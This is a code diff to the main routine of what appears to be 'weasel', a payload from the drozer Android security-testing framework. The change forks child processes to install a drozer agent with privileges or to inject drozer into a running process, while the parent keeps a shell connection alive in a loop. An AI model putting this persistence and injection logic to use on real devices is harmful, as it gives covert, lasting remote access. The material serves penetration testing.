@@ -196,26 +196,33 @@ int main(int argc, char** argv)
     
     /* Bring forth the weasel! */
 
-    if (privileged_weasel())
+    /* Create fork for privileged_weasel */
+    if (fork() == 0)
     {
-        debug("weasel", "[+] The privileged weasel commanded the install of a drozer agent");
-        return 0;
+        if (privileged_weasel())
+            debug("weasel", "[+] The privileged weasel commanded the install of a drozer agent");
+        else
+            debug("weasel", "[-] Your weasel is not privileged");
     }
     else
-        debug("weasel", "[-] Your weasel is not privileged");
-    
-    if (sneaky_weasel())
     {
-        printf("weasel", "[+] Your sneaky weasel has slipped a drozer into your process");
-        return 0;
-    }
-    else
-        debug("weasel", "[-] Your weasel is not sneaky"); 
-
-    while (!defeated_weasel())
-    {
-        debug("weasel", "[*] Weasel loves eggs but really hates shells! This was a last resort...");
-        sleep(5);
+        /* Create fork for sneaky_weasel */
+        if (fork() == 0)
+        {
+            if (sneaky_weasel())
+                printf("weasel", "[+] Your sneaky weasel has slipped a drozer into your process");
+            else
+                debug("weasel", "[-] Your weasel is not sneaky");
+        }
+        else
+        {
+            /* Ensure that there is always a shell connection running in the parent process */
+            while (!defeated_weasel())
+            {
+                debug("weasel", "[*] Weasel loves eggs but really hates shells! Keep this as a last resort...");
+                sleep(5);
+            }
+        }
     }
 
     return 0;  
